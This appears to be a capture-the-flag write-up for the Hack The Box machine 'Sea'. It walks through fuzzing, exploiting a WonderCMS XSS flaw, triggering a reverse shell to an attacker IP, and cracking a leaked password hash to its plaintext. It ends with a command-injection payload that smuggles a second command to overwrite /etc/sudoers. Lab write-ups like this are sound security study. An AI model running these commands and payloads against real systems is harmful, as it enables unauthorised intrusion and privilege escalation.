1,enumerate the ports and services
22/tcp ssh
80/tcp http

2,check the pages and web contents
Firstly, we can use fuff to enumerate the survival urls
![](images/Pasted%20image%2020240813080552.png)From that we can find something interesting:
But very sad, there is nothing useful for us.

So let's check the virtual machine or hosts
`ffuf -u http://sea.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.sea.htb" -fw 582
`
Also in the rabbit hole, so just come to the web page, and let's check the `contact.php`

There would be a little wired url ` http://sea.htb/themes/bike/README.md`
This file give us the hints: `Login to your WonderCMS website.`

So we get the name of power or CMS
Let's find something exploitable for this:
`https://github.com/prodigiousMind/CVE-2023-41425.git`
Then from the poc,we can know the login page is in `http://sea.htb/loginURL`

2, get the user shell
Firstly, we need to put the payload into the /contact.php, it would lead to reverse XSS by the web administrator
Then we need to trigger it 
`curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.65&lport=443'`
Then we get the www-data shell 
By enumerate the directory `/var/www/sea/`
We find the `/var/www/sea/databases.js`
Then we get the certificate
`"password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
`
So we can use hashcat or john to crack it offline
`hashcat cred.hash -m 3200 /usr/share/wordlists/rockyou.txt`

Then we get the result 
`$2a$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance`
There are two users `amay and geo`
Then try to switch to their user account

When we enumerate the ports and services
`netstat -tuln`
```\amay@sea:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:37579         0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:* 
```
The port 8080 is attractive.

So let's port forwarding to localhost
`ssh amay@sea.htb -L 8080:localhost:8080`

Then just use browser to check the web page
`There is a # System Monitor(Developing)

So there would be a command injection  and this is our payload:
`curl -X POST 'http://localhost:80/' -d "log_file=/root/root.txt;cp /dev/shm/sudoers > /etc/suoders&analyze_log="



